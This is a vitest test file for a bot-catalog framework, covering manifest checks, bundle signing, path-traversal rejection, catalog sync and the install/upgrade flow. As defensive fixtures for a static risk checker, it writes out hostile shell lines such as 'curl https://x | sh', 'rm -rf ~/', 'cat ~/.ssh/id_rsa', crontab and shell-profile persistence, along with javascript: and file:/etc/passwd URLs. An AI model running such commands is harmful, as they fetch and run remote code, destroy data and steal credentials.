// 目录 Bot 框架：格式校验、约束检查、打包签名、目录同步、实例的安装升级下架、静态路由的沙箱头。
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import type { AddressInfo } from "node:net";
import { dirHash, packFiles, readBundle, sha256, unpackTo } from "../src/botkit/bundle.js";
import { safeRelPath } from "../src/domain/paths.js";
import { BotCatalog } from "../src/botkit/catalog.js";
import { catalogConfig } from "../src/botkit/config.js";
import { checkStatic } from "../src/botkit/check.js";
import { runEvals } from "../src/botkit/evals.js";
import { localized, parseManifest, versionGte } from "../src/botkit/format.js";
import { BotInstaller, CatalogError, followedAvatar, instanceId } from "../src/botkit/installer.js";
import { packBuiltinCatalog, packCatalog, whoUsesSkill } from "../src/botkit/pack.js";
import { prune, unsupportedKeywords, validate } from "../src/botkit/schema.js";
import { generateCatalogKeys, signCatalog, verifyCatalog } from "../src/botkit/sign.js";
import { botPrompt } from "../src/agent/prompts/system.js";
import { Store } from "../src/store/db.js";
import { UserSkills } from "../src/skills/service.js";
import { readSkillZip } from "../src/skills/archive.js";
import { skillZip, skillMd } from "./skill-fixture.js";
import { botAppCsp, serveBotAppStatic } from "../src/botkit/static.js";
// @ts-expect-error 前端模块是无类型的原生 ES 模块
import { safeExternalUrl } from "../ui/lib/bot-bridge.js";

const TEMPLATE = path.join(import.meta.dirname, "..", "assets", "bot-template");
let tmp: string;
beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "amb-botkit-"));
});
afterEach(() => {
  fs.rmSync(tmp, { recursive: true, force: true });
});

/** 从模板起一个填好 TODO 的 Bot 包 */
function makeBot(dest: string, id = "fixture-bot", version = "1.0.0"): string {
  fs.cpSync(TEMPLATE, dest, { recursive: true });
  for (const f of ["bot.json", "persona.md", "sample.zh-CN.json", "sample.en.json", "ui/locales/zh-CN.json", "ui/locales/en.json", "evals/tasks.json"]) {
    const p = path.join(dest, f);
    fs.writeFileSync(p, fs.readFileSync(p, "utf8").replaceAll("TODO", "filled").replaceAll("__ID__", id).replaceAll("__APP_VERSION__", "0.1.0").replaceAll("__AVATAR__", "blue").replace('"version": "1.0.0"', `"version": "${version}"`));
  }
  return dest;
}
const write = (dir: string, rel: string, text: string) => {
  const f = path.join(dir, rel);
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, text);
};
const rules = (dir: string) => checkStatic(dir).issues.map((i) => i.rule);

describe("bot.json", () => {
  const good = { id: "abc", version: "1.0.0", minAppVersion: "0.1.0", name: { "zh-CN": "名", en: "n" }, summary: { "zh-CN": "一句", en: "s" }, about: { "zh-CN": ["a"], en: ["a"] }, avatar: "blue", permissions: ["workspace-write"], starters: { "zh-CN": ["a", "b"], en: ["a", "b"] }, skills: [] };
  it("合法的能通过", () => {
    expect(parseManifest(good).issues).toEqual([]);
  });
  it("每条规则都能拦下", () => {
    const bad = (patch: object) => parseManifest({ ...good, ...patch }).issues.map((i) => i.rule);
    expect(bad({ id: "Bad_ID" })).toContain("format.id");
    expect(bad({ name: { "zh-CN": "名" } })).toContain("format.name");
    expect(bad({ avatar: "pink" })).toContain("format.avatar");
    expect(bad({ avatar: "film" })).toContain("format.avatar"); // 别人的专属形象
    expect(parseManifest({ ...good, id: "printfilm", avatar: "film" }).issues).toEqual([]);
    expect(bad({ permissions: ["root"] })).toContain("format.permissions");
    expect(bad({ starters: { "zh-CN": ["一句"], en: ["a", "b"] } })).toContain("format.starters");
    expect(bad({ skills: [{ name: "media", source: "x", sha256: "0".repeat(64), author: "a", license: "MIT", url: "https://a" }] })).toContain("format.skills");
  });
  it("文案缺语言时退回 en", () => {
    expect(localized({ "zh-CN": "中", en: "en" }, "ko")).toBe("en");
  });
  it("比较版本号", () => {
    expect(versionGte("0.1.18", "0.1.9")).toBe(true);
    expect(versionGte("0.1.8", "0.1.18")).toBe(false);
  });
});

describe("数据约定", () => {
  const schema = { type: "object", properties: { title: { type: "string" }, items: { type: "array", items: { type: "object", properties: { id: { type: "string" } }, required: ["id"] } } }, required: ["title"] };
  it("校验", () => {
    expect(validate({ title: "a", items: [{ id: "1" }] }, schema)).toEqual([]);
    expect(validate({ items: [] }, schema).length).toBeGreaterThan(0);
  });
  it("剪掉不合法的部分，能渲染多少渲染多少", () => {
    expect(prune({ title: 1, items: [{ id: "1" }, { id: 2 }, "x"] }, schema)).toEqual({ items: [{ id: "1" }] });
  });
  it("不支持的关键字要报出来", () => {
    expect(unsupportedKeywords({ type: "object", properties: { a: { oneOf: [] } } })).toEqual(["#/properties/a/oneOf"]);
  });
});

describe("包", () => {
  it("相同内容哈希相同", () => {
    const a = packFiles([{ path: "b", data: Buffer.from("2") }, { path: "a", data: Buffer.from("1") }]);
    const b = packFiles([{ path: "a", data: Buffer.from("1") }, { path: "b", data: Buffer.from("2") }]);
    expect(sha256(a)).toBe(sha256(b));
  });
  it("拒绝路径穿越", () => {
    for (const p of ["../x", "/etc/passwd", "a/../../b", "a\\b", "C:/x", "a//b", ""]) expect(safeRelPath(p)).toBe(false);
    expect(safeRelPath("ui/a.js")).toBe(true);
    const evil = packFiles([{ path: "../evil", data: Buffer.from("x") }]);
    expect(() => readBundle(evil)).toThrow(/bad path/);
    expect(() => unpackTo(evil, path.join(tmp, "out"))).toThrow();
    expect(fs.existsSync(path.join(tmp, "evil"))).toBe(false);
  });
  it("解包是原子的", () => {
    const dest = path.join(tmp, "out");
    unpackTo(packFiles([{ path: "ui/a.js", data: Buffer.from("1") }]), dest);
    expect(fs.readFileSync(path.join(dest, "ui", "a.js"), "utf8")).toBe("1");
    expect(fs.readdirSync(tmp)).toEqual(["out"]);
  });
  it("目录哈希拒绝符号链接", () => {
    const d = path.join(tmp, "s");
    fs.mkdirSync(d);
    fs.symlinkSync("/etc/passwd", path.join(d, "x"));
    expect(() => dirHash(d)).toThrow(/symlink/);
  });
});

describe("签名", () => {
  it("改过内容就验不过", () => {
    const k = generateCatalogKeys();
    const sig = signCatalog(Buffer.from("a"), k.privateKey);
    expect(verifyCatalog(Buffer.from("a"), sig, k.publicKey)).toBe(true);
    expect(verifyCatalog(Buffer.from("b"), sig, k.publicKey)).toBe(false);
    expect(verifyCatalog(Buffer.from("a"), "garbage", k.publicKey)).toBe(false);
    expect(verifyCatalog(Buffer.from("a"), sig, "garbage")).toBe(false);
  });
});

describe("约束检查", () => {
  let dir: string;
  beforeEach(() => {
    dir = makeBot(path.join(tmp, "bot"));
  });
  it("填好的模板能通过", () => {
    expect(checkStatic(dir).issues).toEqual([]);
  });
  it("模板原样不能过：TODO 没填", () => {
    const raw = path.join(tmp, "raw");
    fs.cpSync(TEMPLATE, raw, { recursive: true });
    expect(rules(raw)).toContain("format.placeholder");
  });
  it("缺文件", () => {
    fs.rmSync(path.join(dir, "sample.en.json"));
    expect(rules(dir)).toContain("format.missing");
  });
  it("示例数据要符合约定，每种语言都查", () => {
    write(dir, "sample.ko.json", '{"title":1,"items":[]}');
    expect(rules(dir)).toContain("format.sample");
  });
  it("示例数据里的 TODO 也要填完", () => {
    write(dir, "sample.en.json", '{"title":"TODO title","items":[]}');
    expect(checkStatic(dir).issues).toContainEqual(expect.objectContaining({ rule: "format.placeholder", file: "sample.en.json" }));
  });
  it("示例数据的文件名不对会报出来，不会被悄悄忽略", () => {
    for (const f of ["sample.json", "sample.fr.json"]) {
      write(dir, f, '{"title":"x","items":[]}');
      expect(checkStatic(dir).issues).toContainEqual(expect.objectContaining({ rule: "format.sample", file: f }));
      fs.rmSync(path.join(dir, f));
    }
  });
  it("界面规则", () => {
    write(dir, "ui/index.html", '<link href="/amb/botapp/kit/kit.css"><script>1</script><img src="https://x/y.png"><div style="a" onclick="b"></div><iframe></iframe>');
    const r = rules(dir);
    for (const k of ["ui.inline-script", "ui.external", "ui.inline-style", "ui.inline-handler", "ui.forbidden-tag"]) expect(r).toContain(k);
  });
  it("界面不能联网、不能碰外层页面、不能引外部模块", () => {
    write(dir, "ui/app.js", 'import x from "https://cdn/x.js";\nimport { mount } from "/amb/botapp/kit/kit.js";\nfetch("/amb/api/settings");\nlocalStorage.a=1;\nwindow.parent.postMessage(1,"*");\neval("1");');
    const r = rules(dir);
    for (const k of ["ui.import", "ui.network", "ui.forbidden-api"]) expect(r).toContain(k);
  });
  it("样式只能用 token", () => {
    write(dir, "ui/app.css", ".a{color:#fff;margin:12px;font-size:14px;background:url(https://x)}\n@import 'x';");
    const r = rules(dir);
    for (const k of ["ui.hardcoded-color", "ui.hardcoded-space", "ui.hardcoded-font", "ui.external", "ui.css-import"]) expect(r).toContain(k);
  });
  it("界面 JS 里的样式也只能用 token", () => {
    const kit = 'import { html } from "/amb/botapp/kit/kit.js";\n';
    const hit = (code: string) => {
      write(dir, "ui/app.js", `${kit}${code}\n`);
      return rules(dir).filter((r) => r.startsWith("ui.hardcoded"));
    };
    expect(hit('const a = { color: "#ff0000" };')).toEqual(["ui.hardcoded-color"]);
    expect(hit('el.style.border = "1px solid rgb(0, 0, 0)";')).toEqual(["ui.hardcoded-color"]);
    expect(hit('html`<svg fill="#abc"></svg>`;')).toEqual(["ui.hardcoded-color"]);
    expect(hit('const a = { padding: "13px" };')).toEqual(["ui.hardcoded-space"]);
    expect(hit('const a = { marginTop: 13 };')).toEqual(["ui.hardcoded-space"]);
    expect(hit('el.style.gap = "12px";')).toEqual(["ui.hardcoded-space"]);
    expect(hit('html`<div style="padding: 13px"></div>`;')).toEqual(["ui.hardcoded-space"]);
    expect(hit('const a = { fontSize: 14 };')).toEqual(["ui.hardcoded-font"]);
    // token、算出来的值、注释、页内锚点和私有方法都不算
    expect(hit('const a = { color: "var(--fg)", padding: "var(--space-3)", gap: "var(--space-2)" };')).toEqual([]);
    expect(hit('const a = { width: `${n}%`, height: "300px", padding: 0 };')).toEqual([]);
    expect(hit('// color: #ff0000\n/* padding: 13px */')).toEqual([]);
    expect(hit('html`<a href="#add"></a>`;')).toEqual([]);
    expect(hit('class A { #add() {} go() { this.#add(); } }')).toEqual([]);
  });
  it("外部链接要走套件：普通链接和 window.open 在沙箱里都不行", () => {
    const kit = 'import { html } from "/amb/botapp/kit/kit.js";\n';
    const hit = (code: string) => {
      write(dir, "ui/app.js", `${kit}${code}\n`);
      return rules(dir).includes("ui.link");
    };
    expect(hit('html`<a href="https://x.test">x</a>`;')).toBe(true);
    expect(hit('html`<a href=${url}>x</a>`;')).toBe(true);
    expect(hit('window.open(url);')).toBe(true);
    expect(hit('location.href = url;')).toBe(true);
    expect(hit('html`<${Link} href=${url}>x<//>`;')).toBe(false);
    expect(hit('html`<a href="#top">x</a>`;')).toBe(false);
    expect(hit('if (location.href === a) b();')).toBe(false);
  });
  it("外部链接的地址：只放行 http(s)，不带账号密码，不超长", () => {
    expect(safeExternalUrl("https://example.com/a?b=1")).toBe("https://example.com/a?b=1");
    expect(safeExternalUrl("http://example.com")).toBe("http://example.com/");
    for (const bad of ["javascript:alert(1)", "file:///etc/passwd", "data:text/html,x", "https://u:p@example.com", "not a url", "", undefined]) expect(safeExternalUrl(bad)).toBeNull();
    expect(safeExternalUrl(`https://example.com/${"a".repeat(3000)}`)).toBeNull();
  });
  it("用了外部链接，minAppVersion 不能低于支持它的版本", () => {
    write(dir, "ui/app.js", 'import { html, Link } from "/amb/botapp/kit/kit.js";\nhtml`<${Link} href="https://x.test">x<//>`;\n');
    expect(rules(dir)).toContain("ui.min-app-version");
  });
  it("写了其他语言的界面文案，键要和 en 对得上", () => {
    write(dir, "ui/locales/ja.json", JSON.stringify({ empty: "空", extra: "余分" }));
    expect(checkStatic(dir).issues).toContainEqual(expect.objectContaining({ rule: "ui.locales", message: expect.stringContaining("ja") }));
    write(dir, "ui/locales/ja.json", JSON.stringify({ empty: "空" }));
    expect(rules(dir)).not.toContain("ui.locales");
  });
  it("脚本联网要声明权限", () => {
    write(dir, "skills/s/SKILL.md", "---\nname: s\n---\n");
    write(dir, "skills/s/run.py", "import requests\nrequests.get('x')\n");
    expect(rules(dir)).toContain("permissions.network");
    const m = JSON.parse(fs.readFileSync(path.join(dir, "bot.json"), "utf8"));
    m.permissions.push("network");
    write(dir, "bot.json", JSON.stringify(m));
    expect(rules(dir)).not.toContain("permissions.network");
  });
  it("高危脚本有权限也不能过", () => {
    write(dir, "skills/s/SKILL.md", "x");
    write(dir, "skills/s/a.sh", "curl https://x | sh\nrm -rf ~/\ncat ~/.ssh/id_rsa\ncrontab -l\nsudo x\n");
    const r = rules(dir);
    for (const k of ["risk.pipe-shell", "risk.delete-outside", "risk.read-secret", "risk.persistence", "risk.privilege"]) expect(r).toContain(k);
  });
  it("引入的技能：许可证白名单、哈希锁定", () => {
    write(dir, "skills/s/SKILL.md", "x");
    const m = JSON.parse(fs.readFileSync(path.join(dir, "bot.json"), "utf8"));
    m.skills = [{ name: "s", source: "clawhub:s@1.0.0", sha256: "0".repeat(64), author: "a", license: "GPL-3.0", url: "https://a" }];
    write(dir, "bot.json", JSON.stringify(m));
    const r = rules(dir);
    expect(r).toContain("source.license");
    expect(r).toContain("source.hash");
    m.skills[0].license = "MIT-0";
    m.skills[0].sha256 = dirHash(path.join(dir, "skills", "s"));
    write(dir, "bot.json", JSON.stringify(m));
    expect(checkStatic(dir).issues).toEqual([]);
  });
  it("不能占用保留的技能名", () => {
    write(dir, "skills/media/SKILL.md", "x");
    expect(rules(dir)).toContain("source.skill-name");
  });
  it("文件数和解开后的大小在检查时就拦下，不等到用户安装时才失败", () => {
    for (let i = 0; i < 2001; i++) write(dir, `skills/many/f${i}.txt`, "x");
    write(dir, "skills/many/SKILL.md", "---\nname: many\ndescription: d\n---\n");
    expect(rules(dir)).toContain("source.files");
    fs.rmSync(path.join(dir, "skills", "many"), { recursive: true });
    for (let i = 0; i < 2001; i++) write(dir, `ui/f/${i}.txt`, "x");
    expect(rules(dir)).toContain("ui.files");
  });
  it("常驻项规则只看真正的配置文件，不误伤带 .profile 的名字", () => {
    write(dir, "skills/s/SKILL.md", "---\nname: s\ndescription: d\n---\n");
    write(dir, "skills/s/a.py", 'SCHEMA = "pkg.conversion.profile.v1"\nx = self.profile\n');
    expect(rules(dir)).not.toContain("risk.persistence");
    for (const line of ['echo x >> ~/.profile', 'echo x >> .bashrc', 'open("$HOME/.zshrc")']) {
      write(dir, "skills/s/a.sh", line);
      expect(rules(dir)).toContain("risk.persistence");
    }
  });
  it("用了套件后来加的能力，minAppVersion 不能低于它出现的版本", () => {
    write(dir, "ui/x.js", "export const f = (bot) => bot.openFile('app/a.pptx');\n");
    expect(rules(dir)).toContain("ui.min-app-version");
    const f = path.join(dir, "bot.json");
    fs.writeFileSync(f, JSON.stringify({ ...JSON.parse(fs.readFileSync(f, "utf8")), minAppVersion: "0.1.20" }));
    expect(rules(dir)).not.toContain("ui.min-app-version");
  });
  it("评测任务的 file 和 files 写错了要报出来", () => {
    const f = path.join(dir, "evals", "tasks.json");
    const good = JSON.parse(fs.readFileSync(f, "utf8"));
    fs.writeFileSync(f, JSON.stringify([...good, { id: "x", prompt: "p", files: [{ match: "(" }] }]));
    expect(rules(dir)).toContain("evals.tasks");
    fs.writeFileSync(f, JSON.stringify([...good, { id: "x", prompt: "p", file: { name: "a" } }]));
    expect(rules(dir)).toContain("evals.tasks");
    fs.writeFileSync(f, JSON.stringify([...good, { id: "x", prompt: "p", file: { name: "a", text: "t" }, files: [{ match: "^app/", absent: true }] }]));
    expect(rules(dir)).not.toContain("evals.tasks");
  });
  it("界面包不能太大", () => {
    write(dir, "ui/big.bin", Buffer.from(Array.from({ length: 800_000 }, () => Math.floor(Math.random() * 256))) as unknown as string);
    expect(rules(dir)).toContain("ui.size");
  });
  it("发现页封面可选；有的话要是 PNG，不超过远程缩略图的上限", () => {
    const png = (extra: number) => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(extra)]);
    fs.mkdirSync(path.join(dir, "cover"), { recursive: true });
    fs.writeFileSync(path.join(dir, "cover/light.png"), png(16));
    expect(rules(dir)).not.toContain("format.cover");
    fs.writeFileSync(path.join(dir, "cover/dark.png"), Buffer.from("GIF89a"));
    expect(rules(dir)).toContain("format.cover");
    fs.writeFileSync(path.join(dir, "cover/dark.png"), png(600 * 1024));
    expect(checkStatic(dir).issues.find((i) => i.rule === "format.cover")?.file).toBe("cover/dark.png");
  });
});

/** 起一个静态服务器当目录地址 */
async function serveDir(root: string, seen?: string[]): Promise<{ url: string; close: () => void }> {
  const server = http.createServer((req, res) => {
    seen?.push(req.url!);
    const f = path.join(root, decodeURIComponent(req.url!.split("?")[0]));
    if (!fs.existsSync(f) || fs.statSync(f).isDirectory()) return void res.writeHead(404).end();
    const data = fs.readFileSync(f);
    const etag = `"${sha256(data)}"`;
    if (req.headers["if-none-match"] === etag) return void res.writeHead(304).end();
    res.writeHead(200, { etag }).end(data);
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
  return { url: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, close: () => { server.closeAllConnections(); server.close(); } };
}

describe("目录", () => {
  let repo: string;
  let out: string;
  let keys: { publicKey: string; privateKey: string };
  let site: Awaited<ReturnType<typeof serveDir>>;
  const seen: string[] = [];
  const pack = (now = 1000) => packCatalog({ root: repo, outDir: out, privateKey: keys.privateKey, now });
  const newCatalog = (dataDir = path.join(tmp, "data")) => new BotCatalog({ dataDir, appVersion: "9.9.9", url: `${site.url}/index.json`, publicKey: keys.publicKey });

  beforeEach(async () => {
    repo = path.join(tmp, "repo");
    out = path.join(tmp, "out");
    keys = generateCatalogKeys();
    makeBot(path.join(repo, "bots", "fixture-bot"));
    fs.mkdirSync(out, { recursive: true });
    seen.length = 0;
    site = await serveDir(out, seen);
  });
  afterEach(() => site.close());

  it("默认只用内置目录；远程目录必须显式指定，off 关闭两者", async () => {
    expect(catalogConfig({}, repo)).toEqual({ bundledDir: path.join(repo, "dist", "catalog") });
    const on = catalogConfig({ AMB_CATALOG_URL: "https://anymodel.bot/catalog/index.json" });
    expect(on.url).toBe("https://anymodel.bot/catalog/index.json");
    expect(on.bundledDir).toBeUndefined();
    expect(on.publicKey).toMatch(/^[A-Za-z0-9+/]+=*$/);
    const data = Buffer.from("x");
    expect(verifyCatalog(data, signCatalog(data, generateCatalogKeys().privateKey), on.publicKey!)).toBe(false);
    expect(catalogConfig({ AMB_CATALOG: "off", AMB_CATALOG_URL: "https://anymodel.bot/catalog/index.json" })).toEqual({});
    expect(new BotCatalog({ dataDir: tmp, appVersion: "0.1.0", ...catalogConfig({ AMB_CATALOG: "off" }) }).remoteEnabled).toBe(false);
  });
  it("没配置地址或公钥时不联网，目录是空的", async () => {
    const c = new BotCatalog({ dataDir: path.join(tmp, "d"), appVersion: "1.0.0" });
    expect(c.remoteEnabled).toBe(false);
    expect(await c.sync()).toBe(false);
    expect(c.list()).toEqual([]);
  });
  it("没过检查的 Bot 整批不发布", () => {
    write(path.join(repo, "bots", "fixture-bot"), "sample.en.json", "{");
    const r = pack();
    expect(r.failures.length).toBe(1);
    expect(fs.existsSync(path.join(out, "index.json"))).toBe(false);
  });
  it("同步、验签、ETag，界面和技能只在需要时下载，同一个包只下载一次", async () => {
    pack();
    const c = newCatalog();
    expect(await c.sync()).toBe(true);
    expect(c.list().map((e) => e.id)).toEqual(["fixture-bot"]);
    expect(await c.sync()).toBe(false); // 304
    expect(seen.filter((u) => u.endsWith(".ambot"))).toEqual([]);
    const e = c.get("fixture-bot")!;
    const ui = await c.ensureUi(e);
    expect(fs.existsSync(path.join(ui, "ui", "index.html"))).toBe(true);
    expect(fs.existsSync(path.join(ui, "persona.md"))).toBe(false);
    await c.ensureUi(e);
    expect(seen.filter((u) => u.endsWith(".ambot")).length).toBe(1);
  });
  it("验签失败不更新", async () => {
    pack();
    fs.writeFileSync(path.join(out, "index.json"), fs.readFileSync(path.join(out, "index.json"), "utf8").replace("fixture-bot", "evil-bot"));
    const c = newCatalog();
    expect(await c.sync()).toBe(false);
    expect(c.lastError).toMatch(/signature/);
    expect(c.list()).toEqual([]);
  });
  it("重启后读缓存也要验签", async () => {
    pack();
    await newCatalog().sync();
    expect(newCatalog().list().length).toBe(1);
    const f = path.join(tmp, "data", "catalog", "index.json");
    fs.writeFileSync(f, fs.readFileSync(f, "utf8").replace("fixture-bot", "evil-bot"));
    expect(newCatalog().list()).toEqual([]);
  });
  it("sha256 对不上的包不解开", async () => {
    pack();
    const c = newCatalog();
    await c.sync();
    const e = c.get("fixture-bot")!;
    fs.writeFileSync(path.join(out, "bundles", `${e.ui.sha256}.ambot`), "tampered");
    await expect(c.ensureUi(e)).rejects.toThrow(/sha256/);
    expect(fs.existsSync(c.bundleDir(e.ui.sha256))).toBe(false);
  });
  it("App 版本不够的不显示", async () => {
    pack();
    const c = new BotCatalog({ dataDir: path.join(tmp, "data2"), appVersion: "0.0.1", url: `${site.url}/index.json`, publicKey: keys.publicKey });
    await c.sync();
    expect(c.list()).toEqual([]);
  });
  it("精选和下架写在 catalog.json，版本不变时上架时间不变", async () => {
    write(repo, "catalog.json", JSON.stringify({ featured: ["fixture-bot"] }));
    expect(pack(1000).index.bots[0]).toMatchObject({ featured: true, publishedAt: 1000 });
    expect(pack(2000).index.bots[0].publishedAt).toBe(1000);
    write(repo, "catalog.json", JSON.stringify({ removed: { "fixture-bot": { reason: "x", security: true } } }));
    const r = pack(3000).index.bots[0];
    expect(r.removed).toMatchObject({ reason: "x", security: true, at: 3000 });
    expect(r.featured).toBeUndefined();
    const c = newCatalog();
    await c.sync();
    expect(c.list()).toEqual([]);
    expect(c.get("fixture-bot")?.removed?.security).toBe(true);
  });
  it("发现页缩略图先用画好的封面 cover/，没有时退回渲染截图 .check/", () => {
    const bot = path.join(repo, "bots", "fixture-bot");
    const png = (s: string) => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from(s)]);
    const shot = png("shot-light");
    const cover = png("cover-light");
    const dark = png("shot-dark");
    write(bot, ".check/light.png", shot as unknown as string);
    write(bot, ".check/dark.png", dark as unknown as string);
    expect(pack().index.bots[0].thumbs).toEqual({ light: sha256(shot), dark: sha256(dark) });
    write(bot, "cover/light.png", cover as unknown as string);
    expect(pack().index.bots[0].thumbs).toEqual({ light: sha256(cover), dark: sha256(dark) });
    expect(fs.readFileSync(path.join(out, "thumbs", `${sha256(cover)}.png`))).toEqual(cover);
  });
  it("Bot 目录删掉之后，下架记录仍在 index 里", () => {
    write(repo, "catalog.json", JSON.stringify({ removed: { "fixture-bot": { reason: "x" } } }));
    pack();
    fs.rmSync(path.join(repo, "bots", "fixture-bot"), { recursive: true });
    expect(pack(2000).index.bots.map((b) => b.id)).toEqual(["fixture-bot"]);
  });
  it("按技能查牵连的 Bot", () => {
    write(path.join(repo, "bots", "fixture-bot"), "skills/s/SKILL.md", "x");
    expect(whoUsesSkill(repo, "s")).toEqual(["fixture-bot"]);
    expect(whoUsesSkill(repo, "none")).toEqual([]);
  });

  describe("实例", () => {
    let data: string;
    let store: Store;
    let c: BotCatalog;
    let inst: BotInstaller;
    let busy = false;
    const stopped: string[] = [];
    beforeEach(async () => {
      data = path.join(tmp, "data");
      fs.mkdirSync(data, { recursive: true });
      store = new Store(path.join(data, "anymodel.db"));
      write(path.join(repo, "bots", "fixture-bot"), "skills/own/SKILL.md", "---\nname: own\n---\n");
      pack();
      c = newCatalog(data);
      await c.sync();
      busy = false;
      stopped.length = 0;
      inst = new BotInstaller({ dataDir: data, store, catalog: c, stopAgent: async (id) => void stopped.push(id), busy: () => busy, startBot: async () => {} });
    });
    afterEach(() => store.close());
    const id = instanceId("fixture-bot");
    const ws = (...p: string[]) => path.join(data, "workspaces", id, ...p);
    const skills = (...p: string[]) => path.join(data, "dsh", id, "skills", ...p);

    it("只看不建实例：读到的是示例数据，本地没有工作区和进程目录", async () => {
      const f = await inst.previewFile(c.get("fixture-bot")!, "app/state.json", "zh-CN");
      expect((f!.json as any).title).toBeTruthy();
      expect(await inst.previewFile(c.get("fixture-bot")!, "app/other.json", "zh-CN")).toBeUndefined();
      expect(store.getBot(id)).toBeUndefined();
      expect(fs.existsSync(ws())).toBe(false);
      expect(fs.existsSync(skills())).toBe(false);
    });
    it("示例数据跟着语言走：缺的语言和不认识的语言退回 en", async () => {
      const title = async (lang: string) => ((await inst.previewFile(c.get("fixture-bot")!, "app/state.json", lang))!.json as any).title;
      expect(await title("zh-CN")).toBe("filled 示例标题");
      expect(await title("en")).toBe("filled sample title");
      expect(await title("ko")).toBe("filled sample title");
      expect(await title("../../secret")).toBe("filled sample title");
    });
    it("初始状态用第一次发消息时的语言", async () => {
      await inst.install("fixture-bot", "en");
      expect(JSON.parse(fs.readFileSync(ws("app", "state.json"), "utf8")).title).toBe("filled sample title");
    });
    it("第一次发消息才建实例：人设、权限、技能、初始状态都到位", async () => {
      const bot = await inst.install("fixture-bot", "zh-CN");
      expect(bot).toMatchObject({ id, origin: "catalog", name: "filled 名称" });
      expect(bot.systemPrompt).toContain("filled");
      expect(bot.settings.computerUse.enabled).toBe(false);
      expect(bot.settings.permission).toBe("workspace");
      expect(bot.app).toMatchObject({ catalogId: "fixture-bot", version: "1.0.0", permissions: ["workspace-write"], skills: ["own"] });
      expect(fs.existsSync(skills("own", "SKILL.md"))).toBe(true);
      expect(fs.readFileSync(skills("amb-app", "SKILL.md"), "utf8")).toContain("app/state.json");
      expect(JSON.parse(fs.readFileSync(ws("app", "state.json"), "utf8")).title).toBeTruthy();
      // 再点一次不会重复创建
      expect((await inst.install("fixture-bot", "en")).name).toBe("filled 名称");
    });
    it("下载失败时什么都不创建", async () => {
      const e = c.get("fixture-bot")!;
      fs.rmSync(path.join(out, "bundles", `${e.runtime.sha256}.ambot`));
      await expect(inst.install("fixture-bot", "zh-CN")).rejects.toMatchObject({ code: "catalog_download_failed" });
      expect(store.getBot(id)).toBeUndefined();
    });
    it("读文件只能读 app/ 下，不合约定的部分剪掉", async () => {
      const bot = await inst.install("fixture-bot", "zh-CN");
      fs.writeFileSync(ws("secret.txt"), "x");
      expect(await inst.readFile(bot, "secret.txt")).toBeUndefined();
      expect(await inst.readFile(bot, "app/../secret.txt")).toBeUndefined();
      fs.symlinkSync(ws("secret.txt"), ws("app", "link.txt"));
      expect(await inst.readFile(bot, "app/link.txt")).toBeUndefined();
      fs.writeFileSync(ws("app", "state.json"), JSON.stringify({ title: "ok", items: [{ id: "1", text: "a" }, { id: 2 }] }));
      const f = await inst.readFile(bot, "app/state.json");
      expect(f!.json).toEqual({ title: "ok", items: [{ id: "1", text: "a" }] });
      expect(f!.issues.length).toBeGreaterThan(0);
      fs.writeFileSync(ws("app", "state.json"), "{ half");
      expect((await inst.readFile(bot, "app/state.json"))!.json).toBeNull();
    });
    it("放进收件箱：文件名清理、重名加序号、不能走出目录", async () => {
      await inst.install("fixture-bot", "zh-CN");
      expect(inst.saveInbox(id, "../../evil.txt", Buffer.from("1"))).toBe("app/inbox/evil.txt");
      expect(inst.saveInbox(id, "evil.txt", Buffer.from("2"))).toBe("app/inbox/evil-2.txt");
      expect(() => inst.saveInbox(id, "big", Buffer.alloc(33 * 1024 * 1024))).toThrow(CatalogError);
    });
    it("升级：新版本替换技能和人设；改过人设的不跟随；正在工作的等下次", async () => {
      await inst.install("fixture-bot", "zh-CN");
      expect(await inst.update(id)).toBe("current");
      const dir = path.join(repo, "bots", "fixture-bot");
      write(dir, "bot.json", fs.readFileSync(path.join(dir, "bot.json"), "utf8").replace('"version": "1.0.0"', '"version": "1.1.0"'));
      write(dir, "persona.md", "新的人设");
      fs.rmSync(path.join(dir, "skills", "own"), { recursive: true });
      write(dir, "skills/next/SKILL.md", "x");
      pack(2000);
      await c.sync();
      busy = true;
      expect(await inst.update(id)).toBe("busy");
      busy = false;
      expect(await inst.update(id)).toBe("updated");
      const bot = store.getBot(id)!;
      expect(bot.systemPrompt).toBe("新的人设");
      expect(bot.app).toMatchObject({ version: "1.1.0", skills: ["next"] });
      expect(fs.existsSync(skills("own"))).toBe(false);
      expect(fs.existsSync(skills("next", "SKILL.md"))).toBe(true);
      expect(stopped).toContain(id);
      inst.markCustomized(id);
      expect(await inst.update(id)).toBe("customized");
    });
    it("线上实例迁移到内置包：同版本内容变化也更新，保留项目并先显示旧界面", async () => {
      const old = await inst.install("fixture-bot", "zh-CN");
      write(ws(), "app/state.json", JSON.stringify({ title: "my project", items: [] }));
      const dir = path.join(repo, "bots", "fixture-bot");
      write(dir, "ui/app.css", "/* updated bundled UI */");
      write(dir, "persona.md", "Bundled persona");
      write(dir, "skills/own/SKILL.md", "---\nname: own\n---\nBundled skill\n");
      const bundledDir = path.join(tmp, "builtin");
      expect(packBuiltinCatalog({ root: repo, outDir: bundledDir }).failures).toEqual([]);
      const network = vi.fn<typeof fetch>().mockRejectedValue(new Error("offline"));
      const local = new BotCatalog({ dataDir: data, appVersion: "9.9.9", bundledDir, fetch: () => network });
      const installer = new BotInstaller({ ...inst.o, catalog: local });
      expect(installer.info(old)).toMatchObject({ base: `/amb/botapp/b/${old.app!.ui}/`, updateAvailable: true });
      expect(await installer.update(id)).toBe("updated");
      const updated = store.getBot(id)!;
      expect(updated.app!.version).toBe(old.app!.version);
      expect(updated.app!.ui).toBe(local.get("fixture-bot")!.ui.sha256);
      expect(installer.info(updated).base).toBe(`/amb/botapp/b/${updated.app!.ui}/`);
      expect(updated.systemPrompt).toBe("Bundled persona");
      expect(fs.readFileSync(skills("own", "SKILL.md"), "utf8")).toContain("Bundled skill");
      expect(JSON.parse(fs.readFileSync(ws("app/state.json"), "utf8")).title).toBe("my project");
